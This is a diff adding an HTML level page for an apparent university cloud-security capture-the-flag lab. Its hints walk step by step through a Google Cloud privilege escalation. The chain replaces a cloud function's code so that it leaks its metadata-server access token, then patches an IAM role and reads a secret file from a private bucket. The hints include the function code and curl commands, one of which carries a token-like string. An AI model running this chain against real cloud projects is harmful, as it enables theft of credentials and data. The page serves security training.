@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>Thunder CTF</title>
+  <link rel="stylesheet" type="text/css" href="../static/style.css">
+  </link>
+  <link href='https://fonts.googleapis.com/css?family=Nova+Square' rel='stylesheet' type='text/css'>
+  </link>
+  <link href='https://fonts.googleapis.com/css?family=Roboto:400,500,300' rel='stylesheet' type='text/css'>
+  </link>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  </meta>
+</head>
+
+<body>
+  <header class="banner" style="top: 5px">
+    <div id="nav">
+      <h1 style="margin-top:0px;">Thunder CTF</h1>
+    </div>
+  </header>
+  <div class="level">
+    <div style="padding-bottom:10px">
+      <a class="levelbanner levelbutton" href="../..">&#8592</a>
+      <h2 class="levelbanner">a5power</h2>
+    </div>
+    <h3 style="text-align: left; padding-left:5px;">Setup:</h3>
+    <pre>python3 thunder.py create a4error</pre>
+      <p>Activate the service account given to you. You MUST do this, as using your google user account to complete the level would be considered cheating.</p>
+      <pre>gcloud auth activate-service-account --key-file=start/a5-access.json</pre>
+    <h3 style="text-align: left; padding-left:5px;">Destroy:</h3>
+    <pre>python3 thunder.py destroy a4error</pre>
+  </div>
+  <br>
+  <div class=hints>
+    <div>
+      <span id="prev" class="hintbanner hintbutton buttondisabled">Prev</span>
+      <span id="hinttitle" class="hintbanner hintbannertext">test</span>
+      <span id="next" class="hintbanner hintbutton">Next</span>
+    </div>
+    <div id="hintdisplay" class="hintdisplay">
+      <pre>testpre</pre>
+    </div>
+  </div>
+  <footer class="bottombanner">PSU CTF: Work done under NSF Award #1821841</footer>
+
+
+
+  <ul id="hint_content" style="display: none">
+    <li>
+      <span>Intro</span>
+      <p>Use the compromised service account credentials given to you to find the secret, 
+which is located in a file called secret.txt in a private bucket on the project.</p>
+    </li>
+    
+    <li>
+      <span>Hint 1</span>
+      <p>Test the permissions of the given credentials using the test-permissions.py script.</p>
+    </li>
+    
+    <li>
+      <span>Hint 2</span>
+      <p>The credentials have the permission cloudfunctions.functions.list</p>
+    </li>
+    
+    <li>
+      <span>Hint 3</span>
+      <p>List the cloud functions in the project:</p>
+      <pre>gcloud functions list</pre>
+    </li>
+    
+    <li>
+      <span>Hint 4</span>
+      <p>Try calling the function using the service account's access token:</p>
+      <pre>curl https://[location]-[project-id].cloudfunctions.net/[function-name] -H "Authorization: Bearer $(gcloud auth print-identity-token)"</pre>
+    </li>
+    
+    <li>
+      <span>Hint 5</span>
+      <p>The function doesn't seem to do anything useful with its current code, but you have the permission cloudfunctions.functions.sourceCodeSet.</p>
+    </li>
+    
+    <li>
+      <span>Hint 6</span>
+      <p>Modify the function's code using:</p>
+      <pre>gcloud functions deploy [function-name] --source=[path/to/code]</pre>
+      <p>Information on how to write cloud functions can be found <a class="inline" href="https://cloud.google.com/functions/docs/writing/http#writing_http_helloworld-python">here</a>, and information on how to use libraries can be found <a class="inline" href="https://cloud.google.com/functions/docs/writing/specifying-dependencies-python">here</a>.</p>
+    </li>
+    
+    <li>
+      <span>Hint 7</span>
+      <p>Cloud functions either have their own service accounts or use the default cloud function service account in order to access other resources, so a cloud function can have more permissions than its caller. Try to gain access to the cloud function's service account.</p>
+    </li>
+    
+    <li>
+      <span>Hint 8</span>
+      <p>Cloud functions get identity and access tokens from the Compute Metadata Server. Get an access token for the function from the metadata server. Information about how to do so can be found <a class="inline" href="https://cloud.google.com/functions/docs/securing/function-identity#fetching_identity_and_access_tokens">here</a>.</p>
+    </li>
+    
+    <li>
+      <span>Hint 9</span>
+      <p>The url to get an access token from the metadata server is http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</p>
+      <p>To have the function return the access token, create the following files:</p>
+      <h3>function/main.py</h3>
+      <pre>import requests
+
+def main(request):
+    metadata_url = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
+    token = requests.get(metadata_url, headers={'Metadata-Flavor': 'Google'}).json()['access_token']
+    return token + '\n'</pre>
+      <h3>function/requirements.txt</h3>
+      <pre>requests</pre>
+      <p>Deploy the new code:</p>
+      <pre>gcloud functions deploy [function-name] --source=./function</pre>
+      <p>Then, call the function to get its access token.</p>
+    </li>
+    
+    <li>
+      <span>Hint 10</span>
+      <p>Test the permissions of the token using the test-permissions.py script.</p>
+    </li>
+    
+    <li>
+      <span>Hint 11</span>
+      <p>The token gives access to editing the permissions of roles and viewing the IAM policy.</p>
+    </li>
+    
+    <li>
+      <span>Hint 12</span>
+      <p>Get the IAM policy to figure out what role your compromised credentials have.</p>
+    </li>
+    
+    <li>
+      <span>Hint 13</span>
+      <p>Use the Resource Manager API function <a class="inline" href="https://cloud.google.com/resource-manager/reference/rest/v1/projects/getIamPolicy">projects.getIamPolicy</a>.</p>
+    </li>
+    
+    <li>
+      <span>Hint 14</span>
+      <textarea>curl --request POST \
+    'https://cloudresourcemanager.googleapis.com/v1/projects/[PROJECT-ID]:getIamPolicy' \
+    --header 'Authorization: Bearer [ACCESS_TOKEN]' \
+    --header 'Accept: application/json' \
+    --header 'Content-Type: application/json' \
+    --data '{}'</textarea>
+    </li>
+    
+    <li>
+      <span>Hint 15</span>
+      <p>Find the role name of a5-access in the iam policy, which is in the form "projects/[project-id]/roles/[role-id]"</p>
+      <p>You can use the "iam.roles.update" permission of the function's access token to expand the abilities of a5-access. Since we know the secret is in a bucket, you should give yourself <a class="inline" href='https://cloud.google.com/storage/docs/access-control/iam-roles#legacy-roles'>permissions to view and list buckets and objects.</a></p>
+    </li>
+    
+    <li>
+      <span>Hint 16</span>
+      <p>Use the IAM API function <a class="inline" href="https://cloud.google.com/iam/reference/rest/v1/projects.roles/patch">projects.roles.patch</a>.</p>
+    </li>
+    
+    <li>
+      <span>Hint 17</span>
+      <p>Query the API, making sure to put role-name in the same format as it was in the IAM policy: "projects/[project-id]/roles/[role-id]"</p>
+      <textarea>curl --request PATCH \
+    'https://iam.googleapis.com/v1/projects/gcp-vulnerable/roles/a5_access_role_386263537928?updateMask=includedPermissions' \
+    --header 'Authorization: Bearer ya29.c.EqEBbAerdibUEho-4AJg94YS9u_asO8q4As4Bso8RLK4HAzFcRiSr0QE4GOdK0xpfOMXDomCI2AqNOU0p4SXKON8RlU9uZth3wMAKRj9W3nYGRcgPftacIhnKXTWapO7IRcyoGCD2buReY2JcSERswZWPQE5f1JBTnHicyykTvPcbxnF5u9DMfh4HjZny1kpF2ZV8jZv7p8eiL2TdeR95LUMz0U' \
+    --header 'Accept: application/json' \
+    --header 'Content-Type: application/json' \
+    --data '{
+      "includedPermissions":[
+        "storage.objects.get"
+        "storage.objects.list",
+        "storage.buckets.get",
+        "storage.buckets.list",
+      ]
+    }'</textarea>
+    </li>
+    
+    <li>
+      <span>Hint 18</span>
+      <p>Now that you have permission to view and list buckets and objects, find secret.txt.</p>
+    </li>
+    
+    <li>
+      <span>Hint 19</span>
+      <pre>gsutil ls
+gsutil ls [bucket-name]
+gsutil cp [secret-object-name] .
+cat secret.txt</pre>
+    </li>
+    
+  </ul>
+
+  <script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+  <script src="../static/slideshow.js"></script>
+  <script src="../static/bannercollapse.js"></script>
+  <script>$(".inline").attr("target","_blank")</script>
+</body>
+
+</html>
